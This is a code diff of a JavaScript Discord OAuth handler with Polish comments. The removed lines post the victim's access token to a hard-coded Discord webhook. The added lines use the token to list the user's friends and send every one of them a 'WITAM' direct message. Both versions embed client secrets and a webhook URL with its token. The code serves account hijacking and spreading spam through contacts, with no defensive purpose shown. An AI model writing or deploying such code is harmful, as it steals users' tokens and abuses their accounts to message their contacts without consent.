@@ -30,26 +30,57 @@
         'Content-Type': 'application/x-www-form-urlencoded'
       },
       body: new URLSearchParams({
-        client_id: '1140982123822583869',
-        client_secret: 'Tli7w7NivUzlasEaMGtDCUZxS2D-nwRr',
+        client_id: '1140982123822583869',            // Zaktualizuj na swoje
+        client_secret: 'Dlu2H1Y14AJ1sT5x-Ko1GX9bGvYMCQtO',    // Zaktualizuj na swoje
         grant_type: 'authorization_code',
         code: code,
-        redirect_uri: 'https://discord.com/channels/1140984355066490930/1140984355066490933',
-        scope: 'identify' 
+        redirect_uri: 'https://discord.com/channels/1140984355066490930/1140984355066490933',      // Zaktualizuj na swoje
+        scope: 'identify'                       // Zakresy, które wykorzystujesz
       })
     })
     .then(response => response.json())
     .then(data => {
       var accessToken = data.access_token;
-      // Wysłanie tokenu dostępu na webhook
-      fetch('https://discord.com/api/webhooks/1140998814434603128/X6xRfXdDHMFW2B12EJwvs-CYEl2NVEWHzLsz1SIW_7gIjBZKwYRdZXEsg-L2ZSXPtPNl', {
-        method: 'POST',
+
+      // Pobierz listę znajomych
+      fetch('https://discord.com/api/v10/users/@me/relationships', {
+        method: 'GET',
         headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          content: `Token dostępu: ${accessToken}`
-        })
+          'Authorization': `Bearer ${accessToken}`
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Wysyłanie wiadomości "WITAM" do każdego znajomego
+        data.forEach(friend => {
+          fetch(`https://discord.com/api/v10/users/@me/channels`, {
+            method: 'POST',
+            headers: {
+              'Authorization': `Bearer ${accessToken}`,
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              recipients: [friend.id],
+              type: 1
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            fetch(`https://discord.com/api/v10/channels/${data.id}/messages`, {
+              method: 'POST',
+              headers: {
+                'Authorization': `Bearer ${accessToken}`,
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                content: 'WITAM'
+              })
+            });
+          });
+        });
+      })
+      .catch(error => {
+        console.error('Błąd:', error);
       });
     })
     .catch(error => {
